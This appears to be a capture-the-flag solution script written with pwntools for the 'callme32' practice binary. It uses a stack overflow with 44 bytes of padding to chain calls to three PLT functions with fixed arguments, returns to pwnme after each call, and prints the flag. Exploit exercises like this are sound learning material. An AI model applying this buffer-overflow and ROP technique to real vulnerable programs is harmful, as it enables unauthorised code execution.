from pwn import *

padding='A'*44
callme_one_plt=p32(0x80485c0)
callme_two_plt=p32(0x8048620)
callme_three_plt=p32(0x80485b0)
pwnme_addr=p32(0x080487b6)

payload1=padding+callme_one_plt+pwnme_addr+p32(1)+p32(2)+p32(3)
payload2=padding+callme_two_plt+pwnme_addr+p32(1)+p32(2)+p32(3)
payload3=padding+callme_three_plt+pwnme_addr+p32(1)+p32(2)+p32(3)

p=process('./callme32')
p.clean()
p.sendline(payload1)
p.clean()
p.sendline(payload2)
p.clean()
p.sendline(payload3)
log.info('flag: '+ p.recv())
